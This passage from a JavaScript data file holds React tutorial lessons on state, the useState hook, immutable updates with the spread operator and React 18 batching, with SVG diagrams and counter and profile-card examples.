                  <li>React wraps the browser's native event in a cross-browser instance called <strong>SyntheticEvent</strong>. It conforms to the W3C event specification, meaning code written for Chrome works with 100% identical property names on Firefox, Safari, Edge, and iOS.</li>
                  <li><strong>Accessing Native Event:</strong> If you ever need access to the browser's underlying raw DOM event, it is accessible via <code>e.nativeEvent</code>.</li>
                  <li><strong>Event Pooling Deprecation:</strong> In React 16 and earlier, SyntheticEvents were pooled and wiped after dispatch for performance. Since React 17+, event pooling was removed, so you can safely read <code>e.target.value</code> inside asynchronous functions (such as <code>setTimeout</code> or <code>fetch</code> callbacks) without calling <code>e.persist()</code>.</li>
                </ul>
              </li>
            </ul>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 24
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-24-what-is-state-usestate",
      number: "24",
      shortLabel: "What Is State & useState",
      title: "What Is State & Introduction to the useState Hook",
      summary: "Understanding state as dynamic component memory, why plain JS variables fail to re-render the UI, the useState hook anatomy, and the fundamental component re-render lifecycle.",
      subtopicLabels: ["24.1 State Mental Model", "24.2 Why Plain Vars Fail", "24.3 useState & Counter"],
      diagramCount: 2,
      sections: [
        {
          num: "24.1",
          title: "Understanding State & Real-World Mental Models",
          content: `
            <p>
              In front-end engineering, a website is not a static brochure—it is an interactive machine whose appearance and data shift constantly based on user actions, timers, and network responses.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>What is "State"?</strong>
                <ul class="notes-sub-list">
                  <li><strong>Definition:</strong> <strong>State</strong> is a component's internal memory. It is a snapshot of all the dynamic data that dictates what is rendered on the screen at any given moment in time.</li>
                  <li>Whenever state changes, the component transitions from its current state to a brand-new state, triggering an automatic visual update.</li>
                </ul>
              </li>
              <li><strong>Real-World Everyday Examples:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Instagram Feed:</strong> When you tap the heart icon, the like count increments from <code>142</code> to <code>143</code>, and the heart icon turns red. That change is a state transition.</li>
                  <li><strong>Shopping Cart:</strong> Adding a pair of shoes increments the cart badge from <code>0</code> to <code>1</code> and computes a new subtotal.</li>
                  <li><strong>Dark Mode Toggle:</strong> Switching the theme from light to dark toggles a boolean state flag from <code>false</code> to <code>true</code>.</li>
                  <li><strong>Authentication:</strong> Logging in shifts the user state from <code>null</code> to <code>{ username: "Sarthak", token: "..." }</code>.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 24.1 · Component State Lifecycle: Transitions & Re-rendering</span>
                <span class="diagram-frame-tag">STATE RECONCILIATION LIFECYCLE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram showing component state transitioning from State A to State B via user action and re-rendering">
                  <!-- State A -->
                  <g transform="translate(25, 25)">
                    <rect x="0" y="0" width="220" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="110" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">INITIAL STATE (A)</text>
                    <text x="110" y="52" text-anchor="middle" class="svg-title">Followers: 26</text>
                    <rect x="15" y="66" width="190" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="110" y="95" text-anchor="middle" class="svg-mono-xs">count = 26</text>
                    <text x="110" y="115" text-anchor="middle" class="svg-sub">Rendered in DOM</text>
                  </g>

                  <!-- User Action Arrow -->
                  <g transform="translate(260, 90)">
                    <line x1="0" y1="10" x2="50" y2="10" stroke="var(--accent)" stroke-width="2"/>
                    <polygon points="50,6 58,10 50,14" fill="var(--accent)"/>
                    <rect x="5" y="-12" width="48" height="18" rx="3" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="29" y="1" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--accent);">Click</text>
                  </g>

                  <!-- React Reconciler -->
                  <g transform="translate(335, 25)">
                    <rect x="0" y="0" width="230" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <text x="115" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">REACT SCHEDULER</text>
                    <text x="115" y="52" text-anchor="middle" class="svg-title">setCount(27)</text>
                    <rect x="15" y="66" width="200" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="115" y="92" text-anchor="middle" class="svg-mono-xs">Detects state change</text>
                    <text x="115" y="112" text-anchor="middle" class="svg-sub">Triggers Virtual DOM diff</text>
                  </g>

                  <!-- Re-render Arrow -->
                  <g transform="translate(580, 90)">
                    <line x1="0" y1="10" x2="50" y2="10" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="50,6 58,10 50,14" fill="var(--success)"/>
                    <text x="25" y="1" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--success);">Patches</text>
                  </g>

                  <!-- State B -->
                  <g transform="translate(645, 25)">
                    <rect x="0" y="0" width="210" height="150" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="105" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">NEW STATE (B)</text>
                    <text x="105" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">Followers: 27</text>
                    <rect x="15" y="66" width="180" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="105" y="95" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">count = 27</text>
                    <text x="105" y="115" text-anchor="middle" class="svg-sub">Surgical DOM update ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "24.2",
          title: "Why Plain JavaScript Variables Fail in React",
          content: `
            <p>
              Beginners often ask: <em>"Why can't I just declare <code>let count = 0</code> and do <code>count++</code> inside my button click handler?"</em>
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Two Fatal Flaws of Standard Variables:</strong>
                <ul class="notes-sub-list">
                  <li><strong>1. Local Variables Do Not Trigger Re-Renders:</strong> React has no built-in mechanism to listen for changes to regular JavaScript variables. Mutating <code>count = count + 1</code> changes the value in memory, but React is completely unaware of the mutation. The Virtual DOM is never updated, and the screen remains frozen at <code>0</code>!</li>
                  <li><strong>2. Local Variables Reset on Every Render:</strong> Whenever a component re-renders (e.g. because its parent re-rendered or another state changed), the component function executes from top to bottom. Any plain variable declared inside (<code>let count = 0</code>) is re-initialized to <code>0</code>, completely wiping out your previous changes!</li>
                </ul>
              </li>
              <li><strong>The Solution — <code>useState</code>:</strong>
                <ul class="notes-sub-list">
                  <li>The <code>useState</code> hook tells React: <em>"Reserve a persistent memory slot for this data in Fiber memory across renders, and provide me with a setter function that notifies React to re-render the UI whenever this data updates."</em></li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 24.2 · Standard Variables vs. useState: The Re-rendering Engine</span>
                <span class="diagram-frame-tag">ENGINEERING COMPARISON</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram contrasting regular variables with useState in React re-rendering">
                  <!-- Normal Variable -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="160" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
                    <text x="95" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">NORMAL VARIABLE ❌</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--danger);">let count = 0; count++</text>

                    <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="94" class="svg-mono-xs">• Mutates in RAM memory only</text>
                    <text x="25" y="114" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">• React engine is NEVER notified!</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--text-muted);">Result: Screen stays frozen at 0</text>
                  </g>

                  <!-- useState Hook -->
                  <g transform="translate(460, 20)">
                    <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="140" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="85" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">USESTATE HOOK ✓</text>
                    <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">const [num, setNum] = useState(0)</text>

                    <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="94" class="svg-mono-xs">• setNum(1) alerts React engine</text>
                    <text x="25" y="114" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">• Schedules immediate re-render</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--text-muted);">Result: UI updates instantly to 1 ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "24.3",
          title: "useState Syntax, Deconstruction & The Counter Pattern",
          content: `
            <p>
              To declare state in a functional component, we import and invoke the <code>useState</code> hook from <code>'react'</code>.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>Anatomy of the <code>useState</code> Call:</strong>
                <pre class="notes-code-block"><code>const [stateValue, setStateFunction] = useState(initialValue);</code></pre>
                <ul class="notes-sub-list">
                  <li><code>initialValue</code>: The starting value of the state (number, string, boolean, array, or object) used during the component's initial mount.</li>
                  <li><code>stateValue</code>: The current value of the state for this specific render cycle.</li>
                  <li><code>setStateFunction</code>: The dispatch function used to schedule an update and notify React to re-render.</li>
                  <li><strong>Array Destructuring:</strong> <code>useState</code> returns an array with exactly two elements: <code>[value, setter]</code>. We use JavaScript array destructuring to assign custom, descriptive names (e.g. <code>[num, setNum]</code>, <code>[isOpen, setIsOpen]</code>).</li>
                </ul>
              </li>
              <li><strong>Common Junior Mistake:</strong> Calling <code>useState</code> without importing it:
                <br><code>Uncaught ReferenceError: useState is not defined</code>
                <br>Always verify: <code>import React, { useState } from 'react';</code>
              </li>
            </ul>

            <pre class="notes-code-block"><code>import React, { useState } from 'react';

function CounterApp() {
  // Declare state variable 'num' initialized to 0
  const [num, setNum] = useState(0);

  const increment = () => setNum(num + 1);
  const decrement = () => setNum(num - 1);
  const jumpFive = () => setNum(num + 5);
  const reset = () => setNum(0);

  return (
    &lt;div className="p-6 max-w-sm mx-auto bg-card rounded-xl shadow-md border text-center"&gt;
      &lt;h2 className="text-sm font-semibold tracking-wide text-text-secondary uppercase"&gt;
        Interactive Counter
      &lt;/h2&gt;
      &lt;div className="text-5xl font-mono font-bold my-4 text-emerald-600"&gt;
        {num}
      &lt;/div&gt;
      
      &lt;div className="flex gap-2 justify-center"&gt;
        &lt;button onClick={decrement} className="px-3 py-1.5 bg-gray-200 dark:bg-gray-700 rounded font-bold"&gt;
          -1
        &lt;/button&gt;
        &lt;button onClick={increment} className="px-3 py-1.5 bg-emerald-600 text-white rounded font-bold"&gt;
          +1
        &lt;/button&gt;
        &lt;button onClick={jumpFive} className="px-3 py-1.5 bg-indigo-600 text-white rounded font-bold"&gt;
          +5
        &lt;/button&gt;
        &lt;button onClick={reset} className="px-3 py-1.5 bg-red-100 text-red-600 rounded font-bold"&gt;
          Reset
        &lt;/button&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  );
}

export default CounterApp;</code></pre>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 25
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-25-how-usestate-works-under-the-hood",
      number: "25",
      shortLabel: "useState Under the Hood",
      title: "How useState Works Under the Hood (Async Updates, Arrays & Objects)",
      summary: "Why state updates are asynchronous and batched, the stale state console.log gotcha, the rule of immutable state updates, and updating complex objects and arrays using the spread operator.",
      subtopicLabels: ["25.1 Async State Updates", "25.2 Immutability Rule", "25.3 Spread Operator", "25.4 Multi-Type State"],
      diagramCount: 2,
      sections: [
        {
          num: "25.1",
          title: "Asynchronous State Updates & The Stale console.log Gotcha",
          content: `
            <p>
              One of the biggest mental hurdles for engineers transitioning to React is realizing that <strong>calling a state setter does NOT immediately update the state variable</strong> in the current execution frame.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Stale Log Surprise:</strong>
                <pre class="notes-code-block"><code>const [count, setCount] = useState(0);

const handleClick = () => {
  setCount(count + 1);
  console.log(count); // Prints: 0, NOT 1!
};</code></pre>
              </li>
              <li><strong>Why Does This Happen?</strong>
                <ul class="notes-sub-list">
                  <li><strong>State is a Snapshot:</strong> When a component renders, it captures a snapshot of state for that specific render pass. In the code above, <code>count</code> is a <code>const</code> variable equal to <code>0</code> inside that render frame.</li>
                  <li><strong>Setter Schedules a Re-Render:</strong> <code>setCount(1)</code> does not mutate the local <code>count</code> constant. It enqueues an update with the React Fiber scheduler. React finishes the current function execution, performs reconciliation, and calls the component again in the <em>next</em> render pass, where <code>count</code> will be <code>1</code>.</li>
                  <li><strong>How to inspect new state:</strong> Use <code>useEffect(() =&gt; { console.log(count); }, [count]);</code> to observe the value after the re-render has completed.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 25.1 · Asynchronous State Setter: Why console.log Reads Stale State</span>
                <span class="diagram-frame-tag">EXECUTION QUEUE TIMELINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Timeline showing setNum scheduling state in background while console.log reads old render value">
                  <!-- Step 1 -->
                  <g transform="translate(30, 25)">
                    <rect x="0" y="0" width="220" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <text x="110" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--primary); font-weight:700;">1 · SYNC CALL</text>
                    <text x="110" y="52" text-anchor="middle" class="svg-title">setNum(30)</text>
                    <rect x="15" y="66" width="190" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="110" y="95" text-anchor="middle" class="svg-mono-xs">Schedules update in RAM</text>
                    <text x="110" y="115" text-anchor="middle" class="svg-sub">Does not block next line</text>
                  </g>

                  <!-- Arrow 1 -> 2 -->
                  <g transform="translate(260, 90)">
                    <line x1="0" y1="10" x2="35" y2="10" stroke="var(--primary)" stroke-width="2"/>
                    <polygon points="35,6 43,10 35,14" fill="var(--primary)"/>
                  </g>

                  <!-- Step 2 -->
                  <g transform="translate(315, 25)">
                    <rect x="0" y="0" width="240" height="150" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <text x="120" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">2 · IMMEDIATE NEXT LINE</text>
                    <text x="120" y="52" text-anchor="middle" class="svg-title" style="fill:var(--danger);">console.log(num)</text>
                    <rect x="15" y="66" width="210" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="120" y="95" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">STILL LOGS: 10</text>
                    <text x="120" y="115" text-anchor="middle" class="svg-sub">Current render snapshot</text>
                  </g>

                  <!-- Arrow 2 -> 3 -->
                  <g transform="translate(565, 90)">
                    <line x1="0" y1="10" x2="35" y2="10" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="35,6 43,10 35,14" fill="var(--success)"/>
                  </g>

                  <!-- Step 3 -->
                  <g transform="translate(620, 25)">
                    <rect x="0" y="0" width="230" height="150" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="115" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">3 · NEXT RENDER</text>
                    <text x="115" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">num is now 30</text>
                    <rect x="15" y="66" width="200" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="115" y="95" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">UI Displays 30 ✓</text>
                    <text x="115" y="115" text-anchor="middle" class="svg-sub">DOM updated cleanly</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "25.2",
          title: "The Immutability Rule & Reference Equality Checking",
          content: `
            <p>
              In JavaScript, primitive types (numbers, strings, booleans) are passed by value, but complex data structures (Arrays, Objects) are stored and compared by <strong>memory reference</strong>.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>How React Detects State Changes (<code>Object.is</code>):</strong>
                <ul class="notes-sub-list">
                  <li>When you call a state setter, React performs a shallow equality check: <code>Object.is(previousState, nextState)</code>.</li>
                  <li>If <code>previousState === nextState</code>, React concludes that <em>nothing changed</em> and immediately skips re-rendering the component (bailout optimization).</li>
                </ul>
              </li>
              <li><strong>The Fatal Direct Mutation Trap:</strong>
                <pre class="notes-code-block"><code>// ❌ NEVER DO THIS IN REACT:
user.age = 25;           // Mutating existing object in-place
setUser(user);           // Memory reference is IDENTICAL! React bails out!

numbers.push(4);         // Mutating existing array in-place
setNumbers(numbers);     // Memory reference is IDENTICAL! Screen will NOT update!</code></pre>
              </li>
              <li><strong>The Golden Rule: Always Provide a New Object/Array Reference:</strong>
                <ul class="notes-sub-list">
                  <li>To update an array or object in React, you must copy the existing data into a brand-new object or array using the spread operator (<code>...</code>) or pure array methods (<code>.filter()</code>, <code>.map()</code>, <code>.concat()</code>).</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 25.2 · Object State Immutability: Shallow Copy & Selective Overwrite</span>
                <span class="diagram-frame-tag">IMMUTABLE OBJECT UPDATE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram showing prev object spreading properties and selectively overriding age to 50">
                  <!-- Previous Object -->
                  <g transform="translate(30, 25)">
                    <rect x="0" y="0" width="220" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
                    <text x="110" y="28" text-anchor="middle" class="svg-kicker">PREVIOUS STATE (prev)</text>
                    <text x="110" y="52" text-anchor="middle" class="svg-title">Original Object</text>
                    <rect x="15" y="66" width="190" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="90" class="svg-mono-xs">user: 'Rishi'</text>
                    <text x="25" y="112" class="svg-mono-xs" style="fill:var(--text-muted);">age: 17</text>
                  </g>

                  <!-- Spread Arrow -->
                  <g transform="translate(265, 90)">
                    <line x1="0" y1="10" x2="35" y2="10" stroke="var(--accent)" stroke-width="2"/>
                    <polygon points="35,6 43,10 35,14" fill="var(--accent)"/>
                    <text x="18" y="2" text-anchor="middle" class="svg-mono-xs" style="font-size:9px; fill:var(--accent);">...prev</text>
                  </g>

                  <!-- Spread & Override -->
                  <g transform="translate(320, 25)">
                    <rect x="0" y="0" width="240" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.8"/>
                    <text x="120" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--accent); font-weight:700;">SHALLOW MERGE</text>
                    <text x="120" y="52" text-anchor="middle" class="svg-title">{ ...prev, age: 50 }</text>
                    <rect x="15" y="66" width="210" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
                    <text x="25" y="90" class="svg-mono-xs">user preserved: 'Rishi'</text>
                    <text x="25" y="112" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">age overridden: 50</text>
                  </g>

                  <!-- Final State Arrow -->
                  <g transform="translate(575, 90)">
                    <line x1="0" y1="10" x2="35" y2="10" stroke="var(--success)" stroke-width="2"/>
                    <polygon points="35,6 43,10 35,14" fill="var(--success)"/>
                  </g>

                  <!-- New State Object -->
                  <g transform="translate(625, 25)">
                    <rect x="0" y="0" width="225" height="150" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <text x="112" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--success); font-weight:700;">NEW OBJECT IN MEMORY</text>
                    <text x="112" y="52" text-anchor="middle" class="svg-title" style="fill:var(--success);">New Reference ✓</text>
                    <rect x="15" y="66" width="195" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="90" class="svg-mono-xs">{ user: 'Rishi',</text>
                    <text x="35" y="112" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">age: 50 }</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "25.3",
          title: "Updating Objects & Arrays With the Spread Operator (...)",
          content: `
            <p>
              To maintain pure immutability without losing existing properties, developers use the JavaScript spread syntax:
            </p>

            <ul class="notes-bullet-list">
              <li><strong>Updating an Object (Shallow Copy + Override):</strong>
                <pre class="notes-code-block"><code>const [user, setUser] = useState({ name: 'Sarthak', age: 24, city: 'Bhopal' });

// Update age while keeping name and city intact:
const updateAge = () => {
  setUser(prev => ({
    ...prev,       // 1. Copy all existing properties into a new object
    age: 25        // 2. Overwrite the specific property
  }));
};</code></pre>
              </li>
              <li><strong>Adding an Item to an Array:</strong>
                <pre class="notes-code-block"><code>const [todos, setTodos] = useState(['Learn JSX', 'Learn Props']);

// Append new item without mutating original array:
const addTodo = (newTodo) => {
  setTodos(prev => [...prev, newTodo]); // New array reference created
};</code></pre>
              </li>
              <li><strong>Removing an Item from an Array (Pure Immutability):</strong>
                <pre class="notes-code-block"><code>// Remove item at specific index using pure .filter():
const removeTodo = (targetIndex) => {
  setTodos(prev => prev.filter((_, idx) => idx !== targetIndex));
};</code></pre>
              </li>
            </ul>
          `
        },
        {
          num: "25.4",
          title: "Complete Multi-Type State Architecture (Production Pattern)",
          content: `
            <p>
              Here is a production-grade component demonstrating how strings, numbers, booleans, objects, and arrays are managed simultaneously under pure immutability:
            </p>

            <pre class="notes-code-block"><code>import React, { useState } from 'react';

function UserProfileCard() {
  // 1. Primitive state
  const [isEditing, setIsEditing] = useState(false);

  // 2. Object state
  const [profile, setProfile] = useState({
    username: 'sarthak_dev',
    email: 'sarthak@example.com',
    stats: { rep: 420, tier: 'Pro' }
  });

  // 3. Array of objects state
  const [skills, setSkills] = useState(['React', 'Tailwind', 'TypeScript']);

  const addSkill = (newSkill) => {
    if (!newSkill.trim() || skills.includes(newSkill)) return;
    setSkills(prev => [...prev, newSkill]); // Immutable append
  };

  const removeSkill = (skillToRemove) => {
    setSkills(prev => prev.filter(s => s !== skillToRemove)); // Immutable delete
  };

  const updateEmail = (newEmail) => {
    setProfile(prev => ({
      ...prev,
      email: newEmail // Immutable object update
    }));
  };

  return (
    &lt;div className="p-6 max-w-md mx-auto bg-card rounded-xl border shadow-sm"&gt;
      &lt;h3 className="text-xl font-bold text-text-primary"&gt;@{profile.username}&lt;/h3&gt;
      &lt;p className="text-sm text-text-muted"&gt;{profile.email}&lt;/p&gt;
      &lt;span className="inline-block mt-2 px-2 py-0.5 text-xs bg-emerald-100 text-emerald-800 rounded font-semibold"&gt;
        {profile.stats.tier} Tier · {profile.stats.rep} Rep
      &lt;/span&gt;

      &lt;div className="mt-4"&gt;
        &lt;h4 className="text-xs uppercase font-bold tracking-wider text-text-muted mb-2"&gt;Skills&lt;/h4&gt;
        &lt;div className="flex flex-wrap gap-1.5"&gt;
          {skills.map(skill =&gt; (
            &lt;span key={skill} className="px-2 py-1 bg-surface border rounded text-xs flex items-center gap-1.5"&gt;
              {skill}
              &lt;button onClick={() =&gt; removeSkill(skill)} className="text-red-500 hover:text-red-700 font-bold"&gt;
                &times;
              &lt;/button&gt;
            &lt;/span&gt;
          ))}
        &lt;/div&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  );
}

export default UserProfileCard;</code></pre>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 26
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-26-batch-updates-functional-state",
      number: "26",
      shortLabel: "Batch Updates & Functional State",
      title: "Batch Updates in React (num + 1 vs. prev => prev + 1)",
      summary: "React 18 automatic batching mechanics, why multiple setState calls collapse to a single render, the stale closure trap, and solving concurrency with functional updater callbacks.",
      subtopicLabels: ["26.1 Automatic Batching", "26.2 Functional Updaters", "26.3 Fiber Queue"],
      diagramCount: 2,
      sections: [
        {
          num: "26.1",
          title: "React 18 Automatic Batching Mechanics",
          content: `
            <p>
              In high-performance user interfaces, re-rendering the DOM is computationally expensive. If a click handler updates three different pieces of state, re-rendering the entire component tree three distinct times would cause visible frame drops and severe UI jank.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>What is Batching?</strong>
                <ul class="notes-sub-list">
                  <li>Batching is React's optimization strategy where multiple state updates are grouped into a single re-render pass for optimal performance.</li>
                  <li>Think of it like a restaurant waiter: the waiter does not sprint to the kitchen with one dish order, run back to the table, and repeat for every customer. Instead, the waiter gathers everyone's orders together and delivers them to the chef in a single trip.</li>
                </ul>
              </li>
              <li><strong>React 18 Universal Batching:</strong>
                <ul class="notes-sub-list">
                  <li>Before React 18, React only batched updates inside native React event handlers (like <code>onClick</code>). Updates inside <code>fetch()</code> promises, <code>setTimeout</code>, or native DOM listeners were not batched.</li>
                  <li>In React 18+, <strong>Automatic Batching</strong> is enabled everywhere by default—inside event handlers, async promises, timeouts, and native callbacks alike!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 26.1 · State Batching: Why Triple setNum(num + 1) Collapses</span>
                <span class="diagram-frame-tag">BATCH RENDERING PIPELINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram showing 3 setNum(num + 1) calls reading identical num = 10 and resolving to 11">
                  <!-- Call 1 -->
                  <g transform="translate(25, 25)">
                    <rect x="0" y="0" width="220" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--danger)" stroke-width="1.6"/>
                    <text x="110" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">CALL 1 (SNAPSHOT)</text>
                    <text x="110" y="52" text-anchor="middle" class="svg-title">setNum(num + 1)</text>
                    <rect x="15" y="66" width="190" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="110" y="95" text-anchor="middle" class="svg-mono-xs">num is captured as 10</text>
                    <text x="110" y="115" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger);">Resolves to: 11</text>
                  </g>

                  <!-- Call 2 -->
                  <g transform="translate(270, 25)">
                    <rect x="0" y="0" width="220" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--danger)" stroke-width="1.6"/>
                    <text x="110" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">CALL 2 (SAME SNAPSHOT)</text>
                    <text x="110" y="52" text-anchor="middle" class="svg-title">setNum(num + 1)</text>
                    <rect x="15" y="66" width="190" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="110" y="95" text-anchor="middle" class="svg-mono-xs">num is STILL 10!</text>
                    <text x="110" y="115" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger);">Resolves to: 11</text>
                  </g>

                  <!-- Call 3 & Result -->
                  <g transform="translate(515, 25)">
                    <rect x="0" y="0" width="340" height="150" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
                    <text x="170" y="28" text-anchor="middle" class="svg-kicker" style="fill:var(--danger); font-weight:700;">CALL 3 & FINAL BATCH VALUE</text>
                    <text x="170" y="52" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Final Resolved Value: 11</text>
                    <rect x="15" y="66" width="310" height="65" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                    <text x="25" y="95" class="svg-mono-xs">• All three read initial snapshot 10</text>
                    <text x="25" y="115" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">• Result: Increments 10 → 11 only</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "26.2",
          title: "The Triple setNum(num + 1) Trap vs. Functional Updaters",
          content: `
            <p>
              Consider this classic React interview question:
            </p>

            <pre class="notes-code-block"><code>const [num, setNum] = useState(0);

const handleTripleClick = () => {
  setNum(num + 1);
  setNum(num + 1);
  setNum(num + 1);
};</code></pre>

            <ul class="notes-bullet-list">
              <li><strong>What will <code>num</code> be after one click?</strong>
                <ul class="notes-sub-list">
                  <li>Most beginners guess <code>3</code>. In reality, the result is <strong><code>1</code></strong>!</li>
                </ul>
              </li>
              <li><strong>Why Does It Collapse to 1? (The Stale Closure Trap):</strong>
                <ul class="notes-sub-list">
                  <li>During the execution of <code>handleTripleClick</code>, the component has not yet re-rendered. The variable <code>num</code> is frozen at <code>0</code> throughout the entire function.</li>
                  <li>Line 1 translates to: <code>setNum(0 + 1)</code> &rarr; requests next state to be <code>1</code>.</li>
                  <li>Line 2 translates to: <code>setNum(0 + 1)</code> &rarr; requests next state to be <code>1</code>.</li>
                  <li>Line 3 translates to: <code>setNum(0 + 1)</code> &rarr; requests next state to be <code>1</code>.</li>
                  <li>React finishes the batch and re-renders with <code>1</code>!</li>
                </ul>
              </li>
              <li><strong>The Solution — Functional Updater (<code>prev =&gt; prev + 1</code>):</strong>
                <ul class="notes-sub-list">
                  <li>Instead of passing a raw value, pass a callback function to the setter:
                    <pre class="notes-code-block"><code>const handleTripleClick = () => {
  setNum(prev => prev + 1);
  setNum(prev => prev + 1);
